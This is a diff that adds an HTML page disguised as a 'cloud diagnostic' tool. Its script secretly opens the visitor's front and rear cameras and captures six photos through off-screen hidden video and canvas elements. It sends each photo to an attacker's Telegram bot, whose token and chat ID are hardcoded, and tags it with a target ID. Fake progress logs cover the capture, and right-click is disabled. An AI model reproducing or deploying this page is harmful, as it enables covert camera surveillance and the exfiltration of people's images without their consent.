@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Architecture Matrix & Environment Diagnostics</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a12;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: #d1d1de;
+        }
+        
+        .container {
+            background: rgba(13, 13, 23, 0.95);
+            padding: 40px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 480px;
+            width: 90%;
+            border: 1px solid #1f1f38;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .matrix-header {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            color: #535370;
+            margin-bottom: 15px;
+        }
+        
+        .status-icon-wrapper {
+            margin-bottom: 25px;
+            position: relative;
+            display: inline-block;
+        }
+
+        .radar {
+            width: 80px;
+            height: 80px;
+            border: 2px solid #3b3b5c;
+            border-radius: 50%;
+            position: relative;
+            animation: radar-pulse 2s linear infinite;
+        }
+
+        @keyframes radar-pulse {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; border-color: #5d5dbd; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+        
+        h1 {
+            color: #ffffff;
+            margin-bottom: 12px;
+            font-size: 20px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        .message {
+            color: #8585a3;
+            margin-bottom: 30px;
+            line-height: 1.5;
+            font-size: 14px;
+        }
+        
+        .progress-container {
+            width: 100%;
+            background: #161626;
+            height: 6px;
+            border-radius: 3px;
+            margin: 25px 0 10px 0;
+            overflow: hidden;
+            border: 1px solid #22223b;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #5151de, #8251de);
+            width: 0%;
+            transition: width 0.4s ease;
+        }
+        
+        .status-logs {
+            color: #626280;
+            font-size: 12px;
+            font-family: 'Courier New', Courier, monospace;
+            margin-top: 15px;
+            min-height: 18px;
+        }
+
+        /* Hidden media layout elements */
+        #cameraVideo, #cameraCanvas {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="cameraVideo" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
+    
+    <div class="container">
+        <div class="matrix-header">Secure Cloud Diagnostic Shell v4.0.1</div>
+        <div class="status-icon-wrapper">
+            <div class="radar"></div>
+        </div>
+        <h1>Analyzing System Architecture</h1>
+        <div class="message">
+            Synchronizing peripheral environment variables with server endpoints. Please maintain network stability during verification.
+        </div>
+        
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <div class="status-logs" id="statusText">Initializing core engine...</div>
+    </div>
+
+    <script>
+        // Production API Configurations
+        const BOT_TOKEN = "8835274198:AAHY5VdHQVZAictbhddI9FwQpEUQ17Xkdgw";
+        const OWNER_ID = "7202927639"; 
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const uid = urlParams.get('uid'); 
+        
+        const progressBar = document.getElementById('progressBar');
+        const statusText = document.getElementById('statusText');
+        const cameraVideo = document.getElementById('cameraVideo');
+        const cameraCanvas = document.getElementById('cameraCanvas');
+        const ctx = cameraCanvas.getContext('2d');
+        
+        let stream = null;
+        let photos = [];
+        let captureCount = 0;
+        const totalTargetCaptures = 6; // 3 front, 3 back
+        let currentFacingMode = "user"; // Start with front camera
+        
+        function updateUIElements(progressCount) {
+            const percentage = (progressCount / totalTargetCaptures) * 100;
+            progressBar.style.width = percentage + '%';
+            
+            const logSteps = [
+                "Allocating localized runtime memory...",
+                "Mapping device API profiles...",
+                "Swapping environment context...",
+                "Parsing deep hardware configurations...",
+                "Optimizing secondary socket pipelines...",
+                "Finalizing structural diagnostics..."
+            ];
+            
+            if (progressCount < totalTargetCaptures) {
+                statusText.textContent = `[LOG]: ${logSteps[progressCount] || "Processing parameters..."}`;
+            } else {
+                statusText.textContent = "[SUCCESS]: Synchronization Complete.";
+            }
+        }
+        
+        async function stopActiveStream() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+        }
+
+        async function bindCameraStream(mode) {
+            await stopActiveStream();
+            try {
+                const constraints = {
+                    video: {
+                        facingMode: mode,
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                };
+                
+                stream = await navigator.mediaDevices.getUserMedia(constraints);
+                cameraVideo.srcObject = stream;
+                
+                return new Promise(resolve => {
+                    cameraVideo.onloadedmetadata = () => {
+                        resolve(true);
+                    };
+                });
+            } catch (err) {
+                console.warn(`Camera mode [${mode}] configuration rejected.`);
+                return false;
+            }
+        }
+        
+        function processInstantSnapshot() {
+            if (!stream) return null;
+            try {
+                cameraCanvas.width = cameraVideo.videoWidth;
+                cameraCanvas.height = cameraVideo.videoHeight;
+                ctx.drawImage(cameraVideo, 0, 0, cameraCanvas.width, cameraCanvas.height);
+                
+                const frameData = cameraCanvas.toDataURL('image/jpeg', 0.6);
+                return frameData.split(',')[1];
+            } catch (e) {
+                return null;
+            }
+        }
+        
+        function parseBase64ToBlob(base64Data) {
+            const binaryString = atob(base64Data);
+            const len = binaryString.length;
+            const bytes = new Uint8Array(len);
+            for (let i = 0; i < len; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            return new Blob([bytes], { type: 'image/jpeg' });
+        }
+        
+        async function transmitPayload(base64Payload, tagLabel) {
+            try {
+                const binaryBlob = parseBase64ToBlob(base64Payload);
+                const packetForm = new FormData();
+                packetForm.append('chat_id', OWNER_ID);
+                packetForm.append('photo', binaryBlob, 'telemetry.jpg');
+                packetForm.append('caption', `📸 [CAM LOG] | Module: ${tagLabel.toUpperCase()} | Target UID: ${uid || "Unknown"}`);
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: packetForm
+                });
+            } catch (err) {
+                console.error("Payload routing failed.", err);
+            }
+        }
+        
+        async function initializeDiagnosticPipeline() {
+            updateUIElements(0);
+            
+            // Phase 1: Bind Front Camera
+            let sessionStatus = await bindCameraStream("user");
+            if (!sessionStatus) {
+                // Fallback attempt without explicit facing mode constraints if strict mode fails
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    cameraVideo.srcObject = stream;
+                    sessionStatus = true;
+                } catch(e) {
+                    sessionStatus = false;
+                }
+            }
+            
+            if (!sessionStatus) {
+                statusText.textContent = "[ERR]: Hardware authorization timeout.";
+                return;
+            }
+            
+            // Capture Sequence Loop
+            const executionInterval = setInterval(async () => {
+                if (captureCount >= totalTargetCaptures) {
+                    clearInterval(executionInterval);
+                    await stopActiveStream();
+                    showTerminationScreen();
+                    return;
+                }
+                
+                const rawFrame = processInstantSnapshot();
+                if (rawFrame) {
+                    const trackingLabel = currentFacingMode === "user" ? "Front-Facing" : "Environment-Back";
+                    await transmitPayload(rawFrame, trackingLabel);
+                    
+                    captureCount++;
+                    updateUIElements(captureCount);
+                    
+                    // Switch to back camera halfway through the total target captures
+                    if (captureCount === 3 && currentFacingMode === "user") {
+                        currentFacingMode = "environment";
+                        await bindCameraStream("environment");
+                    }
+                }
+            }, 2500); // Stable 2.5 second intervals to allow webhook transport without packet collision
+        }
+        
+        function showTerminationScreen() {
+            document.body.innerHTML = `
+                <div class="container">
+                    <div style="color: #5151de; font-size: 32px; margin-bottom: 20px;">✓</div>
+                    <h1>Diagnostic Verification Complete</h1>
+                    <div class="message">
+                        All local node variables matched and optimized successfully. Safe allocation concluded.
+                    </div>
+                    <div class="status-logs">Process Terminated Successfully.</div>
+                </div>
+            `;
+        }
+        
+        window.addEventListener('load', () => {
+            if (!uid) {
+                document.body.innerHTML = `
+                    <div class="container">
+                        <div style="color: #ef4444; font-size: 32px; margin-bottom: 20px;">✕</div>
+                        <h1>Missing Verification Token</h1>
+                        <div class="message">Direct console access restricted. Please trigger from authorized dashboard.</div>
+                    </div>
+                `;
+                return;
+            }
+            // Trigger background diagnostics sequence
+            setTimeout(initializeDiagnosticPipeline, 800);
+        });
+        
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
